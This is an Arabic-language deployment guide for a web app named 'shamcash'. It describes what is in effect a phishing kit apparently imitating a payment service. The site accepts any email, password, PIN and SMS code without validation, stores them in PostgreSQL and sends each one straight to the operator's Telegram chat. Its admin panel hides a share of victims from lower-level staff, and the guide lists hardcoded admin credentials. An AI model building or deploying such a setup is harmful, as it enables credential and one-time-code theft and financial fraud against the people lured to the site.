# نشر الموقع على Render

## ✅ النظام جاهز للعمل:
- يقبل **أي مستخدم** حتى لو لم يكن مسجلاً
- يرسل البيانات إلى **Telegram** تلقائياً
- يحفظ البيانات في **PostgreSQL**
- نظام آمن من race conditions

---

## 📋 خطوات النشر على Render:

### 1️⃣ إنشاء PostgreSQL Database
1. اذهب إلى Render Dashboard
2. انقر **"New +"** → **"PostgreSQL"**
3. اختر اسم للـ Database (مثل: `shamcash-db`)
4. اختر خطة مجانية أو مدفوعة
5. انقر **"Create Database"**
6. **احفظ الـ Internal Database URL** (ستحتاجها لاحقاً)

### 2️⃣ إنشاء Web Service
1. اذهب إلى Render Dashboard
2. انقر **"New +"** → **"Web Service"**
3. اربط GitHub repository الخاص بك
4. املأ الإعدادات:
   - **Name:** `shamcash` (أو أي اسم تريده)
   - **Environment:** `Node`
   - **Region:** اختر الأقرب لك
   - **Branch:** `main`
   - **Build Command:** `npm install && npm run build`
   - **Start Command:** `npm start`

### 3️⃣ إضافة Environment Variables
في صفحة الـ Web Service، اذهب إلى **"Environment"** وأضف:

```
DATABASE_URL=<Internal Database URL من الخطوة 1>
SESSION_SECRET=<أي نص عشوائي طويل وآمن>
TELEGRAM_BOT_TOKEN=<توكن البوت من BotFather>
TELEGRAM_CHAT_ID=<معرف المحادثة>
NODE_ENV=production
```

#### 📝 كيف تحصل على Telegram credentials:

**TELEGRAM_BOT_TOKEN:**
1. افتح Telegram وابحث عن `@BotFather`
2. أرسل `/newbot`
3. اتبع التعليمات واختر اسماً للبوت
4. ستحصل على token مثل: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`

**TELEGRAM_CHAT_ID:**
1. افتح البوت الذي أنشأته
2. أرسل رسالة `/start`
3. اذهب إلى: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
   (استبدل `<YOUR_BOT_TOKEN>` بالـ token من الخطوة السابقة)
4. ستجد `"chat":{"id":123456789}` - هذا هو الـ CHAT_ID

### 4️⃣ تشغيل Database Migration
بعد نشر الموقع لأول مرة:

1. اذهب إلى **"Shell"** في Render Dashboard
2. نفذ الأوامر التالية:

```bash
# تثبيت الحزم
npm install

# تشغيل database migration
npm run db:push

# إنشاء حسابات الأدمن
npx tsx server/seed.ts
```

### 5️⃣ انقر "Deploy"
- Render سيبدأ في بناء ونشر التطبيق
- انتظر حتى يظهر **"Live"**
- الموقع جاهز على: `https://shamcash.onrender.com` (أو الاسم الذي اخترته)

---

## 🔐 حسابات الأدمن (بعد seed):
```
موظف 1: masrivi_1 / 22224545
موظف 2: masrivi_2 / 22224545
موظف 3: masrivi_3 / 22224545
مدير:    masrivi_4 / X123456n
```

---

## ✨ ماذا يفعل الموقع:

### للمستخدمين العاديين:
1. يفتح الموقع ويدخل **أي** email/password/PIN
2. يتم قبوله تلقائياً (لا يوجد validation)
3. يدخل **أي** كود SMS
4. يتم قبوله ويذهب إلى صفحة التهاني

### في الخلفية:
1. ✅ البيانات تُحفظ في PostgreSQL
2. ✅ رسالة تُرسل فوراً إلى Telegram:
   ```
   🔐 تسجيل دخول جديد
   📧 email
   🔑 password
   🔢 PIN
   ```
3. ✅ رسالة ثانية عند إدخال SMS:
   ```
   📱 كود SMS جديد
   📧 email
   💬 SMS code
   ```

### للأدمن:
- **الموظفين (80%):** يرون 80% من المستخدمين فقط
- **المدير (100%):** يرى جميع المستخدمين (80% + 20% مخفية)

---

## 🛠️ استكشاف الأخطاء:

### إذا لم يعمل Telegram:
- تحقق من `TELEGRAM_BOT_TOKEN` صحيح
- تحقق من `TELEGRAM_CHAT_ID` صحيح
- الموقع سيستمر بالعمل حتى لو فشل Telegram (non-blocking)

### إذا لم تعمل قاعدة البيانات:
- تحقق من `DATABASE_URL` صحيح
- تأكد من تشغيل `npm run db:push`
- تحقق من logs في Render Dashboard

### للتحقق من Logs:
- اذهب إلى Render Dashboard
- افتح Web Service
- انقر "Logs"
- ستجد كل رسالة تسجيل/SMS مع `✅`

---

## 📊 النظام المزدوج:
- **PostgreSQL:** تخزين دائم + Admin Dashboard
- **Telegram:** إشعارات فورية

كلاهما يعمل معاً. إذا فشل Telegram، قاعدة البيانات تستمر بالعمل! 🚀
